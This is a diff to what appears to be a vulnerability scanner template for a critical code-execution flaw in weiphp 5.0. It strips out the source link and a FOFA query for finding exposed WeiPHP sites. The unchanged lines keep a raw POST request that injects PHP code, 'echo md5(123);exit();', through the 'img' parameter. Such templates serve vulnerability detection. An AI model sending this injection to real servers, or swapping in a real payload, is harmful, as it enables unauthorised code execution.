@@ -3,12 +3,8 @@ info:
   name: weiphp5.0 scan_callback 代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hvolu2rgkf8wokya'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hvolu2rgkf8wokya
-    fofa: (body="content=\"WeiPHP" || body="/css/weiphp.css" || title="weiphp" || title="weiphp4.0")
 http:
 - raw:
   - 'POST /public/index.php/weixin/Notice/index?img=echo+md5(123);exit(); HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     <xml>
